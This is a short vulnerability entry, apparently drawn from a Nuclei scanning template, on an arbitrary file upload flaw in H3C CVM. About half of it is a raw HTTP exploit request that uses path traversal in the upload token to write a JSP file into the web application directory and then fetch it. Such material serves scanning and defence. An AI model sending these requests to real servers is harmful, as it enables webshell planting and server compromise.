# Vulnerability: H3C CVM - Arbitrary File Upload
**Classification:** H3C
**Source:** Nuclei Template (`h3c-cvm-arbitrary-file-upload.yaml`)

## Description
An H3C CVM vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{filename}}.jsp&name=222" HTTP/1.1
Host: {{Hostname}}
Content-range: bytes 0-10/20
Accept-Encoding: gzip, deflate

{{payload}}

GET /cas/js/lib/buttons/{{filename}}.jsp HTTP/1.1
Host: {{Hostname}}
```

